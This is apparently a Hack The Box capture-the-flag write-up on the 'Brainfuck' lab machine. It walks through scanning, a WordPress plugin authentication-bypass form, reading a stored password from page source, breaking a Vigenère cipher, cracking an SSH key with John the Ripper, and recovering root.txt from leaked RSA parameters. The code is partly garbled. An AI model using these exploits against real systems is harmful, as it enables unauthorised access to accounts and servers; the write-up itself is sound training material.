---
layout: post
title:  "HTB-BrainFucker-L-I"
author: haran
categories: [htblinux , htblinuxInsane]
image: post_img/writeups/htb/linux/1.jpg
beforetoc: "BrainFucker"
toc: true
---

BrainFucker-Insane


![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/1.jpg)

ip = 10.10.10.17

nmap-CheatSheet = https://www.stationx.net/nmap-cheat-sheet/
webapplication 

cryptography 

wordpress 

vignere-encryption 

rsa-key-to-hex-to-ASCII-conversion 

cipertext-rsa-encryption
Reconnaissance
•  First thing first,

•  we run a quick initial nmap scan to see which ports are open and which services are running on those ports.
 
 nmap -sC -sV -O -oA initial 10.10.10.17‌
 
• -sC:run default nmap scripts
• -sV:detect service version
• -O :detect OS
• -oA:output all formats and store in file initial
• -sA:sA flag will let you know whether a firewall is active on the host.
      This uses an ACK scan to receive the information.

 less - Less is a command line utility that displays the contents of a file         or a command output, one page at a time.
 
 ‌We get back the following result showing that five ports are open:

‌• Port22   : running OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
• Port 25  : running Postfix smtpd
• Port 110 : running Dovecot pop3d
• Ports 143: running Dovecot imapd
• Ports 443: running nginx 1.10.0


Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-25 09:49 EST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 09:50 (0:00:04 remaining)
Nmap scan report for 10.10.10.17
Host is up (0.043s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA SASL(PLAIN) TOP RESP-CODES USER AUTH-RESP-CODE PIPELINING UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS more have OK LITERAL+ ENABLE IMAP4rev1 AUTH=PLAINA0001 capabilities SASL-IR IDLE listed ID post-login Pre-login
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .


•  Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.
 
• ‌ Let’s run an nmap scan that covers all ports.

nmap -sC -sV -p- -oA full 10.10.10.17

 The six port states recognized by Nmap 

•open   - An application is actively accepting TCP connections, UDP datagrams or   SCTP    associations on this port.

•closed - A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it.

•filtered - Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port.

•unfiltered - The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed.

•open|filtered - Nmap places ports in this state when it is unable to determine whether a port is open or filtered.

•closed|filtered - This state is used when Nmap is unable to determine whether a port is closed or filtered.

We get back the following result showing that no ports are open.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/2.jpg)

-sU = UDP port scan
-p- = Port scan all ports
-oA = out put the file into udp

 Before we move on to enumeration, let’s make a few mental notes about the nmap scan results.
 
‌1.The version of SSH being used is not associated with any critical vulnerabilities, so port 22 is unlikely to be our point of entry.
  We’ll need credentials for this service.

2.Port 443 is running HTTPS.
 The index page gives us the title “Welcome to nginx!”. This is likely a  configuration issue where the IP address doesn’t know what hostname it should map to in order to serve a specific site and so instead it’s serving the ngnix default page.
 
 To fix this issue we’ll need to first figure out the list of hostnames that resolve to this IP address and then add these hostnames to our /etc/hosts file. From the nmap scan, we get three possible hostnames: 
 brainfuck.htb
 www.brainfuck.htb
 sup3rs3cr3t.brainfuck.htb.

3.Ports 25,143 and 110 are running mail protocols.
  We might need to find a valid email address to further enumerate these services.




![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/3.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/4.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/5.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/6.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/7.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/8.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/9.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/10.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/11.jpg)
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/12.jpg)

Enumeration

• Add the following hostnames to the /etc/hosts file on your attack machine.

10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb 


•  I always start off with enumerating HTTP first. In this case only port 443 is open so we’ll start there
 
• ‌ First,let’s visit the site brainfuck.htb. After adding a security exception, we get the following page.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/13.jpg)
•  This is a WordPress site and we all know that WordPress is associated with so many vulnerabilities.
 
•  However, before we run a WordPress vulnerability scanner on this site,
 let’s look at the certificate information to see if it leaks any useful information.‌To do that, click on the lock icon > Show Connection Details

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/14.jpg)

•  Then click More Information > View Certificate > Details.
  
•  There, we see that the Issuer field gives us the email address  orestis@brainfuck.htb that might be useful when enumerating the open mail  protocol ports. This email can also be found on the website.
  
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/15.jpg)
  
  or 
  
  nikto -h https://brainfuck.htb
 
• Nikto is a free software command-line vulnerability scanner that scans webservers for dangerous files/CGIs, outdated server software and other problems.
  - Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.17
+ Target Hostname:    brainfuck.htb
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
+ Start Time:         2020-05-25 16:44:44 (GMT-4)
---------------------------------------------------------------------------
------------------------------------------------------------------------------------
  
•  Next, let’s run the WordPress vulnerability scanner on the site.

  
wpscan --url https://brainfuck.htb --disable-tls-checks --api-token <redacted>‌
 
 
 • —-url : The URL of the blog to scan.

 • —-disable-tls-checks : Disables SSL/TLS certificate verification.

 • —-api-token : The WordPressVulnDB API Token to display vulnerability data.
 
 images\30-4.png

 The following is a summary of the results found by the wpscan

‌• The WordPress version identified is 4.7.3.

• The identified version of WordPress contains 44 vulnerabilities.

• The WP Support Plus Responsive Ticket System plugin is installed.

• The identified version of WP Support Plus Responsive Ticket System plugin contains 4 vulnerabilities.

wpscan --url https://brainfuck.htb --disable-tls-checks -h

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/16.jpg)

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/17.jpg)

• Out of all the vulnerabilities identified,one particular vulnerability does  stand out.
  
 | [!] Title: WP Support Plus Responsive Ticket System <= 8.0.7 - Remote Code Execution (RCE)
  |Fixed in: 8.0.8
    |References:
      |https://wpvulndb.com/vulnerabilities/8949 
        |https://plugins.trac.wordpress.org/changeset/1763596/wp-support-  plus-responsive-ticket-system
 
 searchsploit WP Support Plus Responsive Ticket System


![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/18.jpg)


•Let’s look at the privilege escalation vulnerability.

searchsploit -x 41006.txt
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/19.jpg)


 You can login as anyone without knowing password because of  incorrect usage of wpsetauth_cookie().

• According to the documentation, this vulnerability allows you to bypass authentication by logging in as anyone without knowing the password. 
  
• You do however need a valid username for the attack to work. Therefore, let’s use wpscan to enumerate usernames.
 
 wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
 
• --enumerate u: enumerates usernames.

•  We get back the following result.
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/20.jpg)



•  Both “admin” and “administrator” are valid usernames.
 
•  Now that we have a valid username, let’s attempt to exploit the vulnerability.
 
 python -m simpleHTTPServer.py
 
 
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

server_address = ('127.0.0.1', 8080)    
httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
os.chdir('C:/')  # optional
print('Running server...')
httpd.serve_forever()



Gaining Initial foothold

• Copy the POC code from the vulnerability entry on searchsploit and save it in the file priv-esc.html.
 
• Change the URL to the name of the machine.
 
 <form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php"> Username: <input type="text" name="username" value="administrator">
 <input type="hidden" name="email" value="sth"> 
 <input type="hidden" name="action" value="loginGuestFacebook">   
 <input type="submit" value="Login">
 </form>
 
• Get the location of the exploit file on the attack machine.

pwd

• Run it in the browser and login as administrator.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/21.jpg)

• Refresh the brainfuck.htb page and we’re logged in as administrator!

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/22.jpg)

•  There doesn’t seem to be much functionality available for this user.
 
•  Therefore, let’s try the ‘admin’ user next.
 
•  Perform the same exploit again except with the username being ‘admin’.
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/23.jpg)
 
•  On the top tab click on Brainfuck Ltd. > Themes.
 
•  Then click on Plugins > Settings on the Easy WP SMTP plugin.
 
•  There, we find the SMTP configuration settings with the SMTP username and SMTP masked password.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/24.jpg)

• Right click on the password field and view page source.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/25.jpg)

•  The user’s password is kHGuERB29DNiNE. Let’s use the mail client Evolution to log into orestis’s email.
  
•  If you don’t have Evolution installed on your kali, you can install it using the following command.
 
•  Install email client
 
 sudo apt-get install evolution
 

•  Open up the Evolution mail client.
 
•  Click on File > New > Mail Account.
 
•  On the Welcome page click Next.
 
•  There, enter the name orestis in the Full Name field and orestis@brainfuck.htb in the Email Address field.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/26.jpg)


•  Click Next. In the Receiving Email window, add brainfuck.htb as the Server, 143 as the Port and orestis as the Username.
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/27.jpg)
 
•  Click Next > Next.
 
•  In the Sending Email window, add brainfuck.htb as the Server, 25 as the Port and No encryption as the Encryption method.
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/28.jpg)
 
•  Click Next > Next. You’ll be prompted with an authentication request. Add the password kHGuERB29DNiNE and click OK. Now we can see orestis’s mail!
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/29.jpg)
 
•  The Form Access Details email gives us another set of credentials.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/30.jpg)

What is SMTP?
 
• SMTP stands for Simple Mail Transfer Protocol and it’s the industry standard  protocol for email sending.

• With SMTP you are sending, relaying, or forwarding messages from a mail client (like Microsoft Outlook) to a receiving email server. A sender will use an SMTP server to carry out the process of transmitting an email message.

• The key thing to keep in mind when thinking about whether to use SMTP or IMAP, is that SMTP is about sending email. So, if you’re looking to enable email sending within your application, then you’ll want to go ahead with using SMTP over IMAP.

What is IMAP?

•If SMTP is all about sending, then what is IMAP?

 Simply put, IMAP (Internet Access Message Protocol) is an email protocol that deals with managing and retrieving email messages from the receiving server.

•Since IMAP deals with message retrieval, you will not be able to use the IMAP protocol to send email. Instead, IMAP will be used for receiving messages.

• Example of SMTP & IMAP Working Together

• Whether you’re sending a transactional email like a password reset, or you’re receiving a paycheck notification — chances are that you’re using both SMTP and IMAP.

 Here’s how SMTP and IMAP work together to transmit an email message.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/31.jpg)

• 1) After creating an email and pressing ‘send’, your email client (e.g. Gmail, Thunderbird, Outlook, etc.) will use SMTP to send your message from your email client to an email server.

• 2) Next, the email server will use SMTP to transmit the message to the recipient’s receiving email server.

• 3) Upon a successful receipt of the SMTP transmission (indicated by a 250 OK response code), the recipient’s email client will fetch the message using IMAP and place it in the inbox for the recipient to access.


What is POP3?

• In addition to IMAP, there’s also another protocol for receiving email — it’s called POP3.

• POP stands for Post Office Protocol.

• And the number three stands for “version 3,” which is the latest version and the most widely used — hence the term “POP3.”
 So, what’s the difference between POP and IMAP?
 POP vs IMAP
 
 POP3 downloads the email from a server to a single computer, then deletes the email from the server.
 
• On the other hand, IMAP stores the message on a server and synchronizes the message across multiple devices.

Should you be using POP3 or IMAP?

 It depends on how you want to access your emails.
 
 Generally speaking, IMAP is more powerful and the recommended method for receiving email if you’re working across multiple devices.
 
 Alternatively, if you prefer to have all emails accessible offline, and if you have a designated device for email, then POP could be a suitable option.
 



Privilege Escalation
• Remember that in the enumeration phase,
 
• we had three hostnames that we added to our hosts file.
 
• Since the email mentions a “secret” forum,
 
• let’s check out the sup3rs3cr3t.brainfuck.htb website.

• On the website, when you click on Log In, you’re presented with a login page.   Enter our newly found credentials there.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/32.jpg)

•We’re logged in as orestis! Click on the SSH Access thread.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/33.jpg)

• Based on the comments made there,
 
• orestis seems to have lost his SSH key and wants the admin to send it to him on an encrypted thread.
 
• One other thing we notice is that orestis always signs his message with the “Orestis — Hacking for fun and profit” phrase.
  
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/34.jpg)
  
  The encrypted thread orestis is referencing is the Key thread.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/35.jpg)

•  Based on the comments made there,
 
•  orestis seems to have lost his SSH key and wants the admin to send it to him on an encrypted thread.
 
•  One other thing we notice is that orestis always signs his message with the “Orestis — Hacking for fun and profit” phrase.
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/36.jpg)
 
• The encrypted thread orestis is referencing is the Key thread. 
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/37.jpg)
 
•  There, you’ll notice that orestis’s comments are signed with the same message
 
•  we saw above except the message is in encrypted form.
 
• However, with each comment, the generated cipher text for the phrase is different.
  Therefore, the admin might be using the Vigenère cipher which is a variation of a Caesar substitution cipher that uses a keyword and repeats it until it matches the length of the plaintext.
 
• Then the equivalent letter of the keyword is used to encrypt its corresponding plaintext letter. Therefore, the same plaintext can generate multiple different cipher texts.
 
• Since we do have the plaintext and its corresponding cipher text, we can deduce the key since this cipher is vulnerable to a known plaintext attack. This page explains it really well, therefore I won’t explain how to do it.

• ‌I wrote a python script to automate the process of finding the key.

plaintext = "OrestisHackingforfunandprofit"
ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"
key = ""for i in range(len(plaintext)):
         num_key = ((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + 97
        char_key = chr(num_key)
        key = key + char_keyprint key

rumkin.com/cipher/vineger-cipher = cyber encryption manual tools

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/38.jpg)


Let’s run the script.

python vigenere-key.py‌



We get back the following result.

brainfuckmybrainfuckmybrainfu‌

• As mentioned earlier, the Vigenère cipher uses a keyword and repeats it until it matches the length of the plaintext.

• Therefore, we can deduce that the key is fuckmybrain. Now that we have the key, we can use it to decrypt the admin’s statement using this online tool.

Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg :)mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr‌

  We get back the following text.

There you go you stupid fuck, I hope you remember your key password because I dont :)https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa‌


 We’re one step closer! We have a link to the RSA private key that seems to be encrypted since the admin mentions a “key password” in the comment. Visit the link to download the RSA key. We get back the following encrypted key.

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/39.jpg)

paste  to clipboard =cat id_rsa|xclip

 Before we use John the Ripper (JtR) to crack the password used to encrypt the private key, we need to convert the file into JtR format.

To do that I use the sshng2john.py script.

python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key‌

Now we can use JtR to crack the password.

john ssh-key --wordlist=/usr/share/wordlists/rockyou.txt 


We get back the following result.

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (/root/Desktop/htb/brainfuck/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:12 DONE (2019-12-26 16:53) 0.08223g/s 1179Kp/s 1179Kc/s 1179KC/sa6_123..*7¡Vamos!
Session completed

 It cracked the password! Let’s use the key and password to SSH into orestis’s machine.
 
 First change the permissions on the encrypted RSA private key.

chmod 600 id_rsa‌


Then SSH into the machine.

ssh -i id_rsa orestis@brainfuck.htb‌


We finally gained an initial foothold!

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/40.jpg)

Grab the user.txt flag.
‌We need to escalate privileges.

List the files in orestis’s home directory.
orestis@brainfuck:~$ ls -la
total 60
drwxr-xr-x 7 orestis orestis 4096 Apr 29  2017 .
drwxr-xr-x 3 root    root    4096 Apr 13  2017 ..
-rw------- 1 root    root       1 Dec 24  2017 .bash_history
-rw-r--r-- 1 orestis orestis  220 Apr 13  2017 .bash_logout
-rw-r--r-- 1 orestis orestis 3771 Apr 13  2017 .bashrc
drwx------ 2 orestis orestis 4096 Apr 29  2017 .cache
drwxr-xr-x 3 root    root    4096 Apr 17  2017 .composer
-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
-rw-r--r-- 1 orestis orestis  655 Apr 13  2017 .profile
drwx------ 8 orestis orestis 4096 Apr 29  2017 .sage
drwx------ 2 orestis orestis 4096 Apr 17  2017 .ssh
-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt

View the content of encrypt.sage.

orestis@brainfuck:~$ cat encrypt.sage
nbits = 1024password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))
p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')

•It seems to be performing RSA encryption.
 
•First, it opens the root.txt file and uses its value as a parameter in the encryption.
 
•The encrypted password is written in the output.txt file.
 
•It also logs parameters in the debug.txt file.
‌ Parameters p, q and e are logged in the debug file which we have read/write   access to. 

•Since we have both p and q, we can calculate n=p*q, phi=(p-1)(q-1).

•We also have c since it’s written in the output.txt file which we have read/write access to.

•So we can calculate m from the equation c = pow(m,e,n).

•Instead of doing that by hand, someone already wrote a script for it. First modify the script to include our values.

RSA Encryption Script

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()


![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/1/41.jpg)

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, ydef main():p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182# compute n
    n = p * q# Compute phi(n)
    phi = (p - 1) * (q - 1)# Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = aprint( "n:  " + str(d) );# Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )# Added code
flag = hex(pt)
flag = str(flag[2:-1])
print flag.decode("hex")

if __name__ == "__main__":
    main()

flag = hex(pt)
flag = str(flag[2:-1])
//to remove 0x in begin and L in end 
//print flag.decode("hex")

flag = str(flag[2:-1])

//to remove 0x in begin and L in end 


I also added code that converts the string to ASCII. Run the script.

python rsa-attack.py


The output gives you the content of the root.txt file.

n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977

pt:246040520294013860499802969537842870790592458678809669442466628493415070037506ef****************************** #redacted

Lessons Learned
To gain an initial foothold on the box we exploited five vulnerabilities.

‌1.A known vulnerability in the WordPress version that is being used to host the website.This could have been easily avoided if the patched version was installed.

2.A password saved in the SMTP configuration settings. Although the password is  masked, the plaintext password can be easily viewed in the source code.

 If the configuration settings does not require that the password be saved on the website, then the user should clear the password and enter the password every time they use the service.

3.A password stored in plaintext in the email. Again, if it is necessary that the password be transmitted by email, the user should have been prompted to change the password upon the first login.

4.The forums used the Vigenère Cipher which is known to be vulnerable to a known plaintext attack. Since we had both the cipher text and the corresponding plaintext, we were able to figure out the encryption key.

5.A weak password was used to encrypt the RSA private key. Since the password was really weak, it only took JtR a couple of seconds to decrypt it. The user should have used a sufficiently long password that is difficult to crack. Similarly, the user should have used a password manager to store the RSA private key instead of having to ask the admin to post it on the website.

‌To escalate privileges I exploited one vulnerability.

‌1.A file that was executed by root was used to encrypt the root.txt file using the RSA algorithm.

 However, the file outputted the “p”, “q” and “e” parameters used in the RSA encryption and therefore we were able to decrypt the cipher text.
 
 So this technically exploited two vulnerabilities:
 
 (1) sensitive information disclosure of RSA parameters and
 (2) security misconfiguration that gave a non-privileged user the ability to read  the debug.txt file which contained sensitive information.
